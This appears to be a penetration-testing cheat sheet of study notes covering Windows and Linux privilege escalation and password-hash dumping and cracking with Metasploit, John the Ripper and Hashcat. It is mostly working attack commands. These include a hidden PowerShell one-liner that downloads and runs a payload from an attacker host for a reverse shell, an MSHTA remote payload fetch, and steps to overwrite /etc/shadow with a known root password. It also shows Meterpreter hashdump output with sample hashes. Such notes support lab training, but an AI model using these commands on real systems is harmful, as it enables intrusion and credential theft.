### Vulnerability Scanning
### Searching For Exploits

### Windows Privilege Escalation
```
use exploit/multi/script/web_delivery
set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
set LHOST <ip>

powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\oPY153Pv.exe')"; (new-object System.Net.WebClient).DownloadFile('http://<ip>:<port>/5YaTnDgYGm1KPK', $z); invoke-item $z
```
-  Listens on `8080` (Web) and `4444` (shell) by default after running `exploit`. Run generated PowerShell code on target to get a shell.

#### MSHTA
```
runas.exe /user:<username> cmd

use exploit/windows/misc/hta_server
exploit

mshta.exe http://<ip>:<port>/<filename>.hta
```

### Linux Privilege Escalation
#### Weak Permissions
```
find / -not -type l -perm -o+w

ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 551 Jan  3 15:31 /etc/shadow
```
- `-o+w` means others have write permissions.

```
openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/

vi /etc/shadow
root:*:17764:0:99999:7::: --> root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::

su
Password: password
```
- Modify `/etc/shadow` by setting root password.


### Dumping and Cracking Windows Hashes
#### John the Ripper
```
meterpreter > ps -S lsass.exe
meterpreter > migrate <pid>

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
- Hashes will appear in `creds`.

```
vi hashes.txt

Paste Administrator and bob's hashes into the text file

john --format=NT hashes.txt

cat .john/john.pot

rm -rf /root/.john
john --format=NT hashes.txt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
- Default wordlist `/usr/share/john/password.lst`.

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```
- Alternative wordlist.

```
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

#### Hashcat
```
hashcat --help

hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt

cat .hashcat/hashcat.potfile
```

### Dumping and Cracking Linux Hashes
- Need privileges to access `/etc/shadow`
	- $1 - MD5 (weakest)
	- $2 - Blowfish
	- $5 - SHA-256
	- $6 - SHA-512

```
meterpreter > cat /etc/shadow
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
```
- Unable to use `hashdump` for Linux?

#### John the Ripper
```
use post/linux/gather/hashdump
set SESSION <session_id>

creds
loot

cat /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash

gzip -d /usr/share/wordlists/rockyou.txt.gz

john --format=sha512crypt /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt --wordlist=/usr/share/wordlists/rockyou.txt

cat .john/john.pot
```
- Must use the unshadowed password file.

```
use auxiliary/analyze/crack_linux
set SHA512 true
```

#### Hashcat
```
hashcat -m 1800 -a 3 /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt /usr/share/wordlists/rockyou.txt

cat .hashcat/hashcat.potfile
```
